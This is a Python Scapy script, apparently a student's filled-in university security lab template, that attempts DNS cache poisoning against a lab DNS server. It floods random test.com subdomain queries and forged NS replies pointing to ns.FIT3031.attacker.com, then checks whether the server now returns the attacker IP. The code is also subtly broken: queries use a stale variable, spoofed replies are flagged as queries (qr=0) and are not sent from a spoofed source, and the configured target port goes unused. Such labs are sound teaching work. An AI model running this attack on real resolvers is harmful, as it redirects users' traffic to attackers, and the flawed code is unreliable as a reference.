#! usr/bin/python3
#FIT3031 Teaching Team

from scapy.all import *
import random

#### ATTACK CONFIGURATION ####
ATTEMPT_NUM = 100
dummy_domain_lst = []

#IP of our attacker's machine
attacker_ip = "10.0.0.2"

#IP of our victim's dns server
target_dns_ip =  "10.4.1.15"

#DNS Forwarder if local couldnt resolve 
#or real DNS of the example.com
forwarder_dns = "8.8.8.8" 

#dummy domains to ask the server to query
dummy_domain_prefix = "abcdefghijklmnopqrstuvwxy0987654321"
base_domain = ".test.com"

#target dns port
target_dns_port = 33333

# Step 1 : create a for loop to generate dummy hostnames based on ATTEMPT_NUM
# each dummy host should concat random substrings in dummy_domain_prefix and base_domain

#Your code goes here to generate 10000 dummy hostnames
dummyid = 1
currentid = 1024

def generate_random_str(randomlength=6):
  """
  生成一个指定长度的随机字符串
  """
  random_str = ''
  length = len(dummy_domain_prefix ) - 1
  for i in range(randomlength):
    random_str += dummy_domain_prefix[random.randint(0, length)]
  return random_str


for i in range(0,ATTEMPT_NUM):
    # dummydomain = str(random.randint(1025,65000)) + dummy_domain_prefix + str(dummyid) + base_domain
    dummydomain = generate_random_str() + str(dummyid) + base_domain
    dummyid = dummyid + 1
    print(dummydomain)
    dummy_domain_lst.append(dummydomain)
    # print(dummydomain[i])

print("Completed generating dummy domains")

#### ATTACK SIMULATION

for i in range(0,ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[i]
    print("> url: " + cur_domain)

    ###### Step 2 : Generate a random DNS query for cur_domain to challenge the local DNS
    # IPpkt = #Your code goes here ??
    # UDPpkt = #Your code goes here ??
    # DNSpkt = #Your code goes here ??
    # query_pkt = IPpkt/UDPpkt/DNSpkt
    # send(query_pkt,verbose=0)
    IPpkt = IP(dst=target_dns_ip)
    # IPpkt = IP(dst=target_dns_ip, src=attacker_ip)
    UDPpkt = UDP(sport=random.randint(100, 60000), dport=53)
    DNSpkt = DNS(id=99, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
            qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
            an=0,
            ns=0,
            ar=0
  )
    query_pkt = IPpkt/UDPpkt/DNSpkt
    send(query_pkt,verbose=0)

    ###### Step 3 : For that DNS query, generate 100 random guesses with random transactionID 
    # to spoof the response packet

    # for i in range(100):
    #     tran_id = #Your code goes here ??
        
    #     IPpkt = #Your code goes here ??
    #     UDPpkt = #Your code goes here ??
    #     DNSpkt = #Your code goes here ??

    #     response_pkt = IPpkt/UDPpkt/DNSpkt
    #     send(response_pkt,verbose=0)
    for i in range(100):
        tran_id = currentid + random.randint(1, 1000)
        NSsec1 = DNSRR(rrname='test.com', type='NS', ttl=259200, rdata='ns.FIT3031.attacker.com')


        IPpkt = IP(dst=target_dns_ip)
        # IPpkt = IP(dst=target_dns_ip, src=attacker_ip)
        UDPpkt = UDP(sport=random.randint(1025, 65000), dport=53)
        DNSpkt =DNS(id=tran_id , opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
                qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
                an=0,
                ar=0,
                ns=NSsec1
      )

        response_pkt = IPpkt/UDPpkt/DNSpkt
        send(response_pkt,verbose=0)

    # ####### Step 4 : Verify the result by sending a DNS query to the server 
    # # and double check whether the Answer Section returns the IP of the attacker (i.e. attacker_ip)
    IPpkt = IP(dst=target_dns_ip)
    # IPpkt = IP(dst=target_dns_ip, src=attacker_ip)
    UDPpkt = UDP(sport=random.randint(1025,65000),dport =53)
    DNSpkt = DNS(id=99,rd=1,qd=DNSQR(qname=cur_domain))

    query_pkt = IPpkt/UDPpkt/DNSpkt
    z = sr1(query_pkt,timeout=2,retry=0,verbose=0)
    try:
        if(z[DNS].an.rdata == attacker_ip):
                print("Poisonned the victim DNS server successfully.")
                break
    except:
             print("Poisonning failed")

#### END ATTACK SIMULATION
